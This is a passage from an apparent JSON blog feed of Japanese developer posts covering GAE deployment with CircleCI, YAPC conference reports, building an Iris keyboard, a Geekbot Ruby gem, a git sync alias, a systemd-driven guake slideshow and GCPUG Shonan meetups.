CircleCIで行うのですが、ローカルでデプロイできるのを確認してから CircleCI の config.yml を書くことにします。Cloud SDKを入れて、以下の command で対象プロジェクトを設定しておきます。gcloud config set project [GCP project ID]その後はデプロイは該当プロジェクトのディレクトリに移動してgcloud app deployを叩くだけでデプロイできます。デプロイできるのを確認できたら、ブログの repository においてある.circleci/config.yml を差し替えます。ひとつポイントをあげるとすると、GAE はバージョンを指定しないとバージョンごとにインスタンスを作ってくれるのですが、ブログの運用くらいだとオーバースペックなので(前バージョンに戻す必要はないので)デプロイ時にオプションでバージョン固定にしています。最後にここまでくれば作業は完了です。あとは今まで同様、markdown で記事を書いて commit すればブログが更新されます。めでたしめでたし。","link":"https://blog.jigyakkuma.org/2018/03/09/gcs-to-gae/","isoDate":"2018-03-08T23:30:37.000Z","dateMiliSeconds":1520551837000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"YAPC::Okinawa 2018 ONNASON に参加できて最高だった話","contentSnippet":"はいさーい！みなさんお元気ですか？YAPC::Okinawa 2018 ONNASON を堪能して帰路の途中です。約 6 年ほど前に今の会社に転職してからいろいろなカンファレンスに参加させていただきましたが、飛行機に乗るようなカンファレンスに行けるとは思ってもいなかったので今回は本当にうれしい経験となりました。JPA主催になってからの YAPC は初めてだったのですが、スタッフの方々も参加者も暖かみのある雰囲気があって「あー！これこれ！！」となり、やっぱりこの界隈のコミュニティが好きだなと再認識できました。謝辞スタッフの皆さま、運営ありがとうございました。前夜祭では登壇を含めいろいろお世話になり感謝でございます。次は場所を提供いただきました沖縄科学技術大学院大学(OIST)です。今回講堂をメインホールとしてお借りしましたが、椅子の座り心地、各席のコンセント配備や使いやすいテーブルなど非常に快適に聴講することができました。沖縄科学技術大学院大学、自然に囲まれたこの広いキャンパスで学べるの、最高の環境ぽい pic.twitter.com/6a681jtQmi— jigyakkuma (@jigyakkuma_) March 3, 2018　(当日はどしゃ降りだったのが悔やまれますが大自然の中にあるキャンパスは想像以上に居心地がよかったです)あと、今回は会社の手厚いサポートにより参加することができましたのでこの場で紹介いたします。スポンサーいただいた企業様のおかげで素晴らしいカンファレンスが開催できたことに感謝いたします。雑感やっぱり地方開催は最高！というのが感想の 9 割でした。懇親会では「関東のカンファレンスには興味があるけど中々行けない」「転職を考えたときにもオフィス訪問ができないのがネック」というよく聞く話が出てきて地方のカンファレンスに初めて参加して大変さがよくわかった。のと同時にだからこそ地方で開催することの意味はあるというのも伝わりました。YAPC::Okinawa 2018YAPC は 2015 以来の参加で、その時はいろんなジャンルの技術カンファレンスという感じだったのですが、地方開催になってからは Perl 色が強くなり(というか Perl のカンファレンスなのでそれが当たり前っちゃ当たり前なんですが)、Perl というプログラミング言語が育んできたコミュニティのよさ、というのを肌で感じました。今は仕事で Perl を書いているというのもあって、Perl ネタのトークは刺激や発見があって Perl を書いてると YAPC が数倍おもしろくなるな(これも当たり前ですが)というのも目の当たりにしました。2018 年春の Perl@karupaneruraさんの Perl 最新情報についての話。定期的に開催しているカンファレンスだからこそ出来る Perl の最新情報が得られるというトークは私のような情報収集をサボりがちな人間には非常にありがたいです。＠ INC まわりは最近ハマったというのもあってなるほどな〜となりました。スライドInline モジュールの世界@moznionさんの Inline モジュールを採用してしまったプロジェクトを供養させるためのトーク。仕事で使うと地獄をみるという知見が得られて有益でした。スライドPerl コーディングテクニック 2018@akiymさんの Perl をコーディングするときのあれこれ。use Strict や Validator などコードを書くときによく出てくるあれこれの話が聞けたのがよかったです。Perl は TMTOWTDI の精神なので好きに書くのがよいというのと好きに書けますというのが独特の文化だなぁというのがよくわかりました。ブログ前夜祭前夜祭では「A Spacemacs Journey -果てしないエディタの旅-」 というタイトルでトークさせていただきましたが、ところどころ検証が足りていなくて発表に間に合っていなかったのと、スライドみながら話そうと思ったらディスプレイの配置が遠かったのとスピーカーモードにしたら手元がめっちゃ小さい表示でスライドが見えず勢いだけの微妙な内容になってしまっていて申し訳なかったということで猛省しております。LTこれが隣の席に座ってる若手エンジニアに「せっかくYAPC::Okinawaに行くならLTもどう？」と声かけたら二つ返事で応募してて最高かよってなった— jigyakkuma (@jigyakkuma_) February 28, 2018こうよ！！！ベストLTは @_serinuntius さんです！ pic.twitter.com/fs4tGtwXQc— yapcjapan (@yapcjapan) March 3, 2018この若者はワシが育てた(ｷﾘｯと言いたいところですが、「カンファレンスで LT したいと思ってたんですよ」「LT の勘所はなんとなく掴んでたのでウケてよかったです」など新人とは思えない返答だったので、そんなこといいながらベスト LT 賞を取っちゃう最近の若者はほんとスゲぇ。最後にサーバサイドのエンジニアをやり始めて数ヶ月とはいえ、プロトコル、Perl のこと、ミドルウェア、運用など知らないことがまだまだたくさんあるというのを痛感するし、仕事でもインターネットでも今以上に貢献したいと思っているので、ベースのスキルを身に着けながらみんなが聴きたくなるような話ができるよう得意分野をみつけようと思いました。おまけ今回、YAPC::Okinawa の翌日に帰ったのですが、14 時の便にしたら思いの外、ゆっくりする時間がなくてお土産を散策して終わってしまったのがもったいなかったので、また YAPC::Okinawa を開催してもらってまた沖縄に遊びにいきたいです！！","link":"https://blog.jigyakkuma.org/2018/03/04/yapc-okinawa2018/","isoDate":"2018-03-04T04:46:17.000Z","dateMiliSeconds":1520138777000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"YAPC::Okinawa 2018 前夜祭で Spacemacs の話をします(予告編)","contentSnippet":"皆さまいかがお過ごしでしょうか。2018/3/3(土)に開催されるYAPC::Okinawa 2018 ONNASONに先立ち、恒例の前夜祭でトークさせていただく運びとなりました！わいわいPerl について話せることがないながらも YAPC で登壇させていただく機会をいただいて人生が変わってと言っても過言ではないくらいお世話になっているカンファレンスなんですが、今回はちょっと Perl の話ができそうでとても楽しみです。応募したトークは「A Spacemacs Journey - 果てしないエディタの旅 -」ということで愛用している Spacemacs で Perl を書くにはどうするのがいいのかという内容で、残念ながら本編からは漏れてしまったのですが前夜祭でのトークはいかがでしょうかと運営スタッフの方からお声がけいただいたので 2 つ返事をして沖縄行きが決定しました。決まってからすぐに発表スライドを作り始めたのですが、「せっかくなので Spacemacs のよさを知ってほしい」と思いながら書き始めたら機能紹介の羅列みたいになってしまって社内からのフィードバックでも「Spacemacs ならではの話をしたほうがいい」「体験談や思っていることを参加者は聞きたいはず」など、カンファレンスでトークすることの意義を見失うところでした。その結果、機能紹介は完全に切り出してトーク前の資料とすることにしました。　ちなみにですが、この資料は補足となるので、ここに書いてある内容にはほとんど触れない予定です！それでは前夜祭でお会いしましょう！！！！","link":"https://blog.jigyakkuma.org/2018/03/02/yapc-okinawa-pre/","isoDate":"2018-03-02T02:44:58.000Z","dateMiliSeconds":1519958698000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"Iris で自作キーボードを作った(組立編)","contentSnippet":"前回は準備編として自作キーボードの検討や購入について触れました。組み立ての前に部品が揃ったらさっそく組み立てたいところですが、その前に組み立ての流れを整理してきましょう。PCB にスイッチダイオードや抵抗、リセット用スイッチや TRRS  Jack をはんだ付けするトッププレートにキースイッチをしっかりはめるキースイッチと PCB をはんだ付けするPro Micro をはんだ付けするファームを焼いて動作確認LED を取り付けるトッププレートとボトムプレートをネジとスペーサーで止めるキートップを取り付ける手順にすると多いですが、電子工作をしたことがある方であれば 1 日あればだいたい終わります。Build Guideに沿って進めていくのがよいです。英文ですが読めば欲しい情報が書いてあったりします。しかし、読むとわかるのですが Iris のマニュアルは途中までしか書かれていないので注意が必要です。はんだ付けはんだ付け自体はそう難しくないのですが、知識が乏しくて悩んだところがありました。スイッチダイオードと抵抗の取り付け方向スイッチダイオードは極性があるので取り付ける方向を間違えると正しく動作しなくなります。で、Iris はというと、左右関係なく黒いラインが下にくるように配置してはんだ付けすればよいです。はんだ付けの注意点はんだ付け自体はそう難しくないのですが、1 点注意するとすれば極力高さを出さないということでしょうか。部品を浮かせないはんだを必要以上に盛らないを心がけてください。2 点で止めるダイオードやキースイッチはまだ修正できますが、Pro Micro は浮いたままはんだ付けしてしまうと取り返しがつかなくなってしまいます。浮いてないか何度も確認しながら慎重にはんだ付けするのが失敗をしないコツでした。キースイッチとプレートの関係最初、PCB とプレートをどのように固定するのかというのがいろいろ調べてみても情報が出てこなくてだいぶ困りました。LED テープライトの取り付けこれは Iris の Build Guide に書かれておらず、Iris を組み立てた方々の blog を漁りましたが、うまくいかず割と苦労しました。Nyquistの Build Guide を眺めていたらビンゴでした。master 側の RGB から信号を出力master 側の Extra Data から RGB の信号を出力Slave 側は Extra Data からの RGB 信号を入力とすると配線する必要があったようです。Tips細々としたメモ:浮きがなければスペーサーはギリギリ 9mm でもいけそうボトムプレートは接地面にネジが出てしまうのでゴム足があるとよいキートップのホームポジションがわからないのでエポキシ系接着剤を少量たらしたらいい感じにわかりやすくなったボディをアクリルにするならカラー入りのクリアなタイプがかっこいい最後にIris を使ってみた感想としては親指シフトは慣れてくれば指の移動が減ってよい格子配列は指が困惑しがち内側のキーは少し押しにくいのでスタビライザーをつけて 1 キーにしてしまってもよいかも60%はちょうどよかったというところでした。まだ慣れていないところもありますが概ね満足しているのと、キーボード作るの面白いので、またよさげな PCB みつけたら作ろうかなと画策しています。それでは皆さまもよい自作キーボードライフをお過ごしください！","link":"https://blog.jigyakkuma.org/2018/02/12/iris-build/","isoDate":"2018-02-12T00:30:03.000Z","dateMiliSeconds":1518395403000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"Iris で自作キーボードを作った(準備編)","contentSnippet":"素晴らしい世の中になったもので、キーボードも楽に自作できる時代が来ましたね。自作キーボードの検討まずは何を作るのか、というのを決めるところからですよね。・ キー数が少なすぎるのはあまり好みではないこれらの条件だと一番情報量の多い Let’s Split は候補から外れてしまいました。40%キーはさすがにレイヤーのスイッチングが多すぎて実用するのがしんどそう、というところが本音でした。Irisという PCB がみつかり、要件が揃ってそうだったので、こちらで作ってみることにしました。パーツの購入次は必要な部品の購入です。今回は・ お気に入りの MX Cherry Black 相当のキースイッチにしたいというオーダーで揃えました。名称価格購入先備考Iris PCB(Rev 2.1a)\xa52,749keeb.ioKey Switch(Getoron Black)\xa51,848keeb.io多めに購入Micro USB Cable\xa5329keeb.ioPro Micro\xa51,800Amazon左右それぞれに必要なので 2 個購入Key Cap\xa53,456TALP多めに購入アクリルプレート\xa51,800コーナンカット代は含まないスペーサー(M2x10mm)\xa5600Amazonネジ(M2x6mm)\xa51,000Amazon4 極ケーブル\xa5650AmazonLED テープライト(WS2818B)\xa51,280Amazon買ったのは 60 個だけど使ったのは 8 個リード線\xa5500Amazonエポキシ系接着剤\xa5500AmazonPro Micro のコネクタ部分の強化用合計\xa516,512金額は市販のメカニカルキーボードと比べてもそう高くはないですね。Iris はキットになっていて、スイッチングダイオードやリセットスイッチ、TRRS Jack なんかもセットになってるので自作キーボードが初めての方も安心ですね。購入での注意すべきポイントわーわー言うほどのポイントはないのですが、ポイントかなと思うところを少し書いておきます。・ 要件を決めておいてまとめて買う(迷いながら買い足しを何回もしてしまってリードタイムがわりとあった)公式の図面に記載があるので参考にするくらいでしょうか。あとは共同購入といったのも見かけるので、そういったのを利用してみるのもいいかもしれないです。組立編でお会いしましょう！","link":"https://blog.jigyakkuma.org/2018/02/11/iris-prep/","isoDate":"2018-02-11T05:50:49.000Z","dateMiliSeconds":1518328249000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"転職をしようとした結果、部署異動した話","contentSnippet":"めっきり寒くなってきましたがいかがお過ごしでしょうか。転職しようと思ったきっかけ遡ること今年の年初、今の会社(とか部署)でもう働きたくないって事案が相次いで重なり、入社してから 5 年も経過してるからここいらで潮時かな…と一人でモヤモヤしながら思い詰めてました。転職活動中の出来事決意してからは自分が今までやってきた仕事にマッチしそうな Web の会社にお話を伺ったり面談をお願いしました。部署異動の検討当時は私が担当する情シス(社内インフラと社内で呼ばれている)はリソースとしては 1.7 人くらいだったのと適任者は社内外でもそうみつからないので、簡単に「部署異動したいです！」とは言えない状況でした。そんな中で部署異動を勧めていただいた時にスッと楽になったのは今でも覚えています。部署異動が決まってから部署異動が決定したものの、リソース問題は残っており色々調整を図っていたところ奇跡が起きました。後任が採用できたのです。現在10月からソーシャルゲーム事業部というところでスマホゲームのサーバサイドエンジニアとして Perl を書いております。振り返り結果として部署異動という選択はよかったです。一緒に働いている人たちは好きなのと今回のモヤモヤの理由は会社を絶対に離れたいということではなかったというのが大きいとは思います。最後に人それぞれいろんな選択があるかと思うので、今の境遇にモヤモヤしてる人の何かの参考になれば幸いです。","link":"https://blog.jigyakkuma.org/2017/12/15/change-jobs-2017/","isoDate":"2017-12-14T23:15:15.000Z","dateMiliSeconds":1513293315000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"Geekbotのgemを作った話","contentSnippet":"こんにちは、Misoca開発チームの@Pranc1ngPegasusです。今年の7月からMisocaにjoinしました。自己紹介はこちら。この記事は、Misoca Advent Calendar 2017の11日目の記事です。突然ですが、みなさんはGeekbot(https://geekbot.io) を使っていますか?GeekbotはSlackプラグインの1つで、設定した時間に質問をしてくれて、回答内容をSlackチャンネルに流してくれるというツールです。Misocaでは主にプロジェクト朝会前の情報共有に使っています。プロジェクト開始時には必ず設定するので、自動化ツールを作ることにしましたが、Geekbotにはgemがなかったので作りました。github.com使い方リポジトリのREADMEにも書いてあるのですが、改めて紹介します。レスポンスは全てjson形式で返ってきます。使い始めるまでまず、ここにアクセス、Slack認証をしてGeekbotのAPI_TOKENを取得します。それを.envなどの設定ファイルに貼り付けます(もちろん直書きしてもいいです)。client = Geekbot::Client.new(access_token: ENV[\'<your_access_token>\'])のようにして準備完了です。チームメンバーの一覧を取得するclient.index_teams#=> GET /v1/teamsreportの一覧を取得するclient.index_reports#=> GET /v1/reportsstandupの一覧を取得するclient.index_standups#=> GET /v1/standups特定のstandupを取得するclient.show_standup(id: xxx)#=> GET /v1/standups/:idstandupを作成する※ 現在Geekbot管理元に問い合わせ中ですが、APIから作成したstandupをUI側から操作することができません。client.create_standup(params: param)#=> POST /v1/standupsstandupを更新するclient.update_standup(id: xxx, params: param)#=> PATCH /v1/standups/:idstandupを置き換える※ 現在Geekbot管理元に問い合わせ中ですが、現在リクエストを送ると500エラーが返ってきます。client.replace_standup(id: xxx, params: param)#=> PUT /v1/standups/:idstandupを削除するclient.destroy_standup(id: xxx)#=> DELETE /v1/standups/:id必要なparamsstandupを作成したり、更新したりする場合に必要なパラメータは以下のようになっています。リクエストを送信する際には全てのパラメータを送ってあげる必要があるようです。{  \\"name\\": \\"MyStandup\\",  \\"channel\\": \\"#general\\",  \\"time\\": \\"10:30:00\\",  \\"timezone\\": \\"Europe/London\\",  \\"wait_time\\": 15,  \\"days\\": [ \\"Mon\\", \\"Wed\\", \\"Fri\\" ],  \\"questions\\": [ { \\"question\\": \\"What did you do since yesterday?\\" }, { \\"question\\": \\"What will you do today?\\" } ],  \\"users\\": [ 10, 11, 12 ]}感謝Geekbot管理元のチャットサポートに問い合わせをしたときに、所在地のギリシャが早朝4:30にも関わらず爆速で返答をしてくれたPanosさんに感謝します。gemを作成する上で、APIから作ったものがUIで編集できなかったり、エラーが返ってくるメソッドがあったりしましたが、Panosさんに報告したところ、開発チームに連絡をして、現在改修に向かっているとのことなので、近いうちに全てのメソッドが使えるようになると思われます。最後にないものは作る!というものづくりの精神でgemを作ってみました。はじめてgemを作ってみたのですが、APIの動きやレスポンスに対するRuby側の動きなど、私自身のRubyへの理解が深まり、とても良い経験だったと感じています。Misoca Advent Calendar 2017、明日の担当は@lulu-ululです。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2017/12/11/000000?utm_source=feed","isoDate":"2017-12-10T15:00:00.000Z","dateMiliSeconds":1512918000000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"git syncコマンドをつくっていろいろ自動化した","contentSnippet":"これはなにGitでいちいちfetchしてmergeしてmerged branchを削除して…とやるのがめんどくさいので自動化した。その方法をまとめる。どうした~/.gitconfigに以下の記述を追加した[alias]  sync = !git checkout master && git fetch -p origin && git merge origin/master && git branch --merged | grep -v master | grep -v \'*\' | xargs -I % git branch -d %やっていることは以下のとおり。1. masterブランチに移動1. remoteリポジトリをfetch1. remoteリポジトリをlocalリポジトリにマージ1. ローカルリポジトリにあるマージ済ブランチを削除どうやって使うの$ git syncこれだけ。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2017/09/01/000000?utm_source=feed","isoDate":"2017-08-31T15:00:00.000Z","dateMiliSeconds":1504191600000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"華金について真剣に議論して出した答え","contentSnippet":"久しぶりのブログ更新ですが、エンジニアリングとは無縁の話です。私は同僚と華金について真剣に議論する機会があったので、真面目な気持ちで議論してみました。最高の華金にするにはどうすればいいかという議論を真剣にしています pic.twitter.com/oCWRHOESul— jigyakkuma (@jigyakkuma_) June 16, 2017どうすれば最高の華金になるかの議論が白熱してます pic.twitter.com/SfnOwAoSky— jigyakkuma (@jigyakkuma_) June 16, 2017「華金なんて好きにお酒でも飲んでりゃいいでしょｗｗｗ」とお思いの方もいらっしゃるかと思いますが、我々は「華金を最高のものにするにはどうすればいいか」というお題を設けてみました。華金とは一体なんなのかまずは華金とは何か、という整理をすべきであると考えました。華金を楽しむために我々は仕事をしている華金は仕事でバリューを出した結果であり、華金をするためにバリューを出せるようにする華金をするにはバリューを出せばいいので、どうやってバリューを出すかを考えるバリューを出すことが目的ではなく、あくまでも華金をすることを目的とすればよいこう書くと「仕事でバリュー出せとかいう意識高い系の話かよー」と勘違いしてしまうかもしれないですが、それは全くの誤解です。また、華金は単に飲み会をすればいいというわけでもなく、お酒の席が苦手であれば別の好きなことをやればよいレイトショーを観に行く、ゲーム大会を開催するなども立派な華金となり得ると、各々が最高と思えることをやればそれが華金と言えるので、華金の定義や形式張ったものは不要です。最高の華金とは何か次に、最高の華金とは何かについて考えてみます。最高の華金をしたい人たちが最高の華金をやるためのモチベーションをもって最高の華金を全力で楽しむが最高の華金ではないかと考えます。最高の華金は華金が始まる前から始まっているでは次に、華金はどうすれば最高になるのかを考えてみます。華金に対しての意識を高めるとか面倒くさそう冒頭にも書きましたが、「楽しく飲みに行きたいだけなのに、こういう話はメンドクセー！！！」という話も出ました。たしかにおっしゃるとおりです。華金力の高い人材を育成するでは、ここで言う「華金力の高い人材」とは何を指すのか。「華金をコーディネートでき、かつそれを主体的に広めていける人材」華金に誘える人が周りにいないぞ…どうすれば…たしかに、人によってはそういうケースもありますよね。そこまでしてなんで華金がしたいの？ここまで、華金華金と言ってきましたが、なんでそこまでして華金がしたいの？という疑問が出てきてもおかしくないですね。「限りある華金という瞬間を少しでも最高にしたい」最後に最後まで読んでいただきありがとうございます。華金は誰もが楽しめるエンターテイメントエンターテイメントを楽しむなら妥協はするな限りある華金に全力で挑めといったところでしょうか。おじさんになっていくと内臓やら足腰がやられてきて自由が効かなくなってきます。もしかすると家族の事情でそれどころではなくなってしまうかもしれません。人生における「華金」という最高の瞬間には特別な価値があり、それを謳歌できるうちに全力になるのは決して悪いものではないと思います。多少偏った話もあったかと思いますが、皆様がそれぞれ幸せについて考えるきっかけになれば幸いです。","link":"https://blog.jigyakkuma.org/2017/06/17/hanakin/","isoDate":"2017-06-16T15:33:30.000Z","dateMiliSeconds":1497627210000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"desktop entry で自作アプリの登録方法","contentSnippet":"最近、作業環境を ApricityOS に変えました。gnome ベースなのとおしゃれな見た目なのが気に入っているのですが、1 つ困ってることがありました。業務で社内用 Gyazo が用意されているので、それを使っているのですが、自作クライアントを dock から起動させたい、ただそれだけなんですがそのあたりがよくわかってなかったので調べてみました。Dash to dockApricityOS は gnome extentions のDash to dockを採用していました。(Dash to dock のイメージ)Setting などを見たところ、Dash to dock はあくまでも dock なのでアプリの管理を行っているわけではないようです。ヒントがなくて悩むどっかにアプリを定義してるところありそうなのになかなか見つけられんなーと思いながらあれこれしていると ApricityOS に ice というアプリが入っているのに気づく。“Apricity OS lets you put your favorite web apps on the desktop with ICE, a simple SSB (Site Specific Browser) manager. “と書いてあったので試してみたらサイトをシングルアプリとして起動できるようによしなにしてくれるツールであった。このツールを使うとサイトがアプリとして起動できるように dock に追加されていて「おっ！もしや？？」となった。desktop entry先ほどの ice で登録したアプリがどっかにファイルとして生成されてるのは明白だったので探ってみると.desktop というファイルが置かれており、ここでようやく desktop entry を知ることができた(長かった)。desktop entryはリンク先にほぼほぼ書いてあるのですが、freedesktop.orgの仕様があり、フォーマットに沿ったファイルを/usr/share/applications とか ~/.local/share/applications に設置することでアプリケーションのデスクトップエントリとしてショートカットを配置できるようです。今回は以下のようなファイルを~/.local/share/applications に配置しました。配置するとこんな感じ(Gyazo アイコンがそれです)gnome 系を使っていたこともあったのに desktop entry について知らなかったのでいい勉強になりました。","link":"https://blog.jigyakkuma.org/2016/07/11/desktop-entry/","isoDate":"2016-07-11T12:51:58.000Z","dateMiliSeconds":1468241518000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"YAP(achimon)C::Asia Hachioji 2016 に参加(登壇)させていただいきました ","contentSnippet":"夏はカンファレンスの時期ですね！謝辞YAP(achimon)C::Asia Hachioji の Organizers、スタッフの皆様、場所を提供いただきましたMicrosoft 様、ありがとうございました！経緯YAP(achimon)C::Asia Hachioji(以後 yapc8oji)、最初は傍観していたのですが、主催者の方が「応募頼む！！！！」みたいな悲痛の叫びをされていたので賑やかしで応募したのが経緯でした。「応募の Issue がわいわいしてればいいかー」くらいの気持ちだったのですが、ありがたくも採択いただき、少々焦りましたが粛々と資料を作成し始めました。苦悩資料作るといつも思いますが、「ちゃんと説明したいけど、ウケも狙いたいし、どういう方向性がいいのかなー」みたいな葛藤があって、書いては消しを繰り返してました…内容今回は実際に運用している AWS アカウントと AWS IAM 管理の社内の仕組みを事例として話しました。反省「仕組みを紹介する」、ということ自体は Blog でもできるから、それ以外のところをうまく伝える、楽しんでもらえる構成にすべきだったなーというのがありました。次回はスピリチュアルな話ができるネタで挑戦したいと思います。感想話す内容は割とニッチであるので覚悟はしていたので、見に来ていただいた方々には感謝です。少しでも皆様の参考になったのであれば幸いです。あとはプレゼンのうまさ(抑揚やアイスブレイク、場の空気づくりなど)はまだまだなので、エンターテイメント性は上げていきたいところです。それでは、またどこかでお会いしましょう！！！！１今年もノベルティのステッカーあります #yapc8ojiB pic.twitter.com/s7b7Q1YBte— jigyakkuma (@jigyakkuma_) July 2, 2016[追記]運営の方に動画をアップロードいただきましたので以下よりご覧ください！","link":"https://blog.jigyakkuma.org/2016/07/02/yapcasia8oji/","isoDate":"2016-07-02T07:25:51.000Z","dateMiliSeconds":1467444351000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"GCPUG Shonan vol.3 に参加してきた","contentSnippet":"GCPUG Shonan も 4 回目の開催。今回も GAE の話題が中心でした。GCPUG Shonan vol.3<いつものお礼>茅ヶ崎 login 様、ありがとうございました！appengine ja nigntに登壇された方々をお招きしての GAE 事例あれこれ紹介といった内容でした。GAE のアクセス制限app.yaml に login Element を設定しておくとアクセス制限ができる。参考 URL- url: /admin/.*  script: admin.app  login: adminみたいにしておくと、GCP Console の IAM で Admin 権限を付与したユーザのみがアクセスできるページが作れるというもの。GAE からのメール送信制限社内で GAE を使ったツールを作成するに当たって、要件としてメールの送信があったのでメール送信数の制限については参考になった。AppEngine quotaGAE flexible environment私の知っている GAE はいわいる GAE Standard environment と呼ばれるものでした。AppEngine typeGAE のカスタムドメイン設定GAE でカスタムドメイン設定を行うと、設定したアカウントからは設定が見えるが他ユーザからは GCP Console を見てもカスタムドメインの設定がされていないように見えるとのこと。また、懇親会もいつものように盛り上がったので、その様子も。懇親会\uD83C\uDF52\uD83C\uDF52\uD83C\uDF52 #gcpug pic.twitter.com/UaBTyUk5xi— Ryuji Tsutsui (@ryu22e) June 19, 2016GCPUG Shonan にはさくらんぼが出る \uD83D\uDCDD #gcpug pic.twitter.com/iARp3XYCMP— sou (@sou) June 19, 2016GCPUG Shonan スタッフの@tora470さんの差し入れのさくらんぼでキャッキャする感じでした。あと、今回は appengine ja night で登壇された方々にも参加いただいたのでいつも以上にわいわいできてよかったと思います。地域密着イベントではありますが、参加人数にも限界があるので遠方から足を運んでいただける方には感謝しかないですね！","link":"https://blog.jigyakkuma.org/2016/06/19/gcpug-shonan03/","isoDate":"2016-06-19T12:43:16.000Z","dateMiliSeconds":1466340196000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"guake の背景画像を systemd でいい感じに切り替える","contentSnippet":"今回はいつもお世話になってる terminal の話です。今使ってるのが manjaro linux(KDE)なんですが、こちらは yakuake で使っていて、maia という theme できれいに統一されてたのと背景画像の透過の調整が難しかったのでカスタマイズせずに使ってました。今回も guake のスライドショーやるかーと思って cron を仕込もうかと思ったら Arch ではデフォルトで cron 入れねぇみたいなのが書いてあったので systemd の timer を仕込むことにしました。guake-slideshow.shまずはスライドショーをやってくれす shell script ですが、これは gconftool-2 を使って切り替えます。guake-slideshow.serviceguake-slideshow.sh を叩く systemd の service です。shell script や画像のあるディレクトリはここで調整するようにしてます。guake-slideshow.timersystemd に仕掛ける timer です。Setting$ cd ~/bin$ lsguake-slideshow.sh$ cd ~$ mkdir -p ~/.config/systemd/user && $_$ lsguake-slideshow.service guake-slideshow.timer$ systemctl --user start guake-slideshow.timersystemd に関する記事は探せばたくさん出てくるので、ここでは手順をメモする程度にとどめます。仕事でよく目にする terminal だからこそ、好きなアニメ画像などを切り替えるだけで捗るってもんですね！","link":"https://blog.jigyakkuma.org/2016/06/16/guake-slideshow/","isoDate":"2016-06-15T23:44:59.000Z","dateMiliSeconds":1466034299000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"GCPUG Shonan vol.2 に参加してきた","contentSnippet":"前回は GAE 勉強会(過去 blog はこちら)でしたが今回はハンズオンということで GAE を実際に触る回でした。GCPUG Shonan feat.GAE vol.2<恒例のお礼>茅ヶ崎 login 様、ありがとうございました！今回はハンズオンということもあり以下のような構成でした。GAE の導入主催の@nuki_ponさんより GAE についての簡単な説明。GAE で静的コンテンツの配信ここからはハンズオン形式で GAE を触ってみることに。https://github.com/FreeGufo/gae-static-templateはまりどころはそこまでないとは思いますが、ここに記載ない内容で行くと、「Google Developer Console」を使用可能な状態にしておくというのがあります。https://console.cloud.google.comにアクセスし、クレジットカードを登録してから初める必要があります。あとは GAE だけでなく、GCP 全般に言えることとしてはプロジェクト作成時にプロジェクト名を入力するのですが、その際に自動的にプロジェクト ID が付与されるので、各サービスで指定する場合はプロジェクト ID とするのが注意点です。WordPress on GAE後半は@ryu22eさんに WordPress を GAE 動かすハンズオンを行っていただきました。資料と参考 blogを見ながら進めると簡単に構築できました。懇親会今回は前回とは違う顔ぶれとなり、テーマがよかったのかフロントをメインにされている女性の方も参加いただいていたので、幅広い方に知っていただくという意味ではよい方向に向かっているのかなと思いました。最後に今後も参加予定なので、もしこの blog を見て参加しよう！という気になった方がいましたら気軽にお声がけいただけると幸いです。","link":"https://blog.jigyakkuma.org/2016/04/17/gcpug-shonan02/","isoDate":"2016-04-17T03:56:49.000Z","dateMiliSeconds":1460865409000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"GCPUG Shonan vol.1 に参加してきた","contentSnippet":"前回は vol.0 ということで正式な開催ではなかったのかな？という感じでしたが、晴れて GCPUG Shonan の vol.1 が開催されるということで今回も参加してきました。(前回参加の blog はこちら)今回もスタッフの皆様ならびにご協力いただきました茅ヶ崎 login 様、ありがとうございました！GCPUG Shonan vol.1 は 3 本立てでした。GCPUG Getting Started主催の@nuki_ponさんから GCPUG の開催に当たってのもろもろの話。ここにまとまっているので読んだほうが早いです。自営 de GAE@secondarykeyさんによる GCP の簡単な紹介と GAE の導入についての解説をしていただきました。資料はこちら)GAE の特徴や連携できる機能などをまとめていただいており、ざっくり知るのにちょうどいい内容でした。GAE と GAS@soundtrickerさんの主に GoogleAppsScript の話。資料はこちら)GoogleAppsScript のメリットをわかりやすく教えていただきました。あと参考になったのは GAE と Pub/Sub で使うというのは良さそうな感じでした。Datastore について@sinmetalさんの Google Cloud Datastore についての話。下調べしてなかったのですが、AWS でいうところのDynamoDBでした。資料はこちら)Datastore については使ってないので DynamoDB と比較しにくいですが、機能やパフォーマンスは Datastore に分があるように感じました。GCP トレーニングの講師もされている方なので、お礼も兼ねてここで宣伝させていただきます。懇親会今回も食事とお酒をご用意いただき、和気あいあいと会話させていただきました。最後に都内で開催される凄腕エンジニアが集まる勉強会もいいのですが、地元開催のイベントで地元を盛り上げつつその近辺のエンジニアが繋がるというのも中々楽しいのではとは思っております。今回は地元メンバーが 3 人ということだったので、これからも繋がっていけるエンジニアが 1 人でも増えればいいなと思っておりますので、次回以降も参加して活性化をお手伝いできればとは思います。","link":"https://blog.jigyakkuma.org/2016/02/28/gcpug-shonan01/","isoDate":"2016-02-28T12:26:32.000Z","dateMiliSeconds":1456662392000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"障碍対応と私","contentSnippet":"この記事は、モバイルファクトリー Advent Calendar 2015 18日目の記事です昨日は@yashims85さんのAndroid 